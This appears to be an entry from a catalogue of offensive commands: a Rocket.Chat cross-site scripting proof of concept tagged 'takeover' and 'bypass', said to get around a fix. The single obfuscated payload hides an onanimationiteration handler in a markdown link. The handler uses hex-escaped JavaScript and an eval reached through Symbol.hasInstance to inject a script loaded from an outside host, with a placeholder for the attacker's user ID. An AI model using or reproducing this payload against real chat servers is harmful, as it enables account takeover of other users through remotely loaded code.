---
data: >-
  https://a?p=[ ](https://a.de?
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration='s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2fPoC?user={ATTACKER_USER_ID}&https=true\x27;document.body.appendChild\x28s\x29;'instanceof{[Symbol.hasInstance]:eval}`.")
tags:
  - takeover
  - bypass
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.233Z'
id: 842deca2-31c8-497a-8830-236b4c4538c7
verified: false
validated: true
submitted: true
---
# rocket-chat-postfix-takeover-poc1

## Command

```javascript
https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2fPoC?user={ATTACKER_USER_ID}&https=true\x27;document.body.appendChild\x28s\x29;'instanceof{[Symbol.hasInstance]:eval}`.")
```

## Description

Post-fix PoC to load takeover script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {ATTACKER_USER_ID} | User ID | Yes |

## Examples

Replace param and send.

## Expected Output

Script loads for takeover.

## Related

- [[commands/rocket-chat-websocket-takeover]]
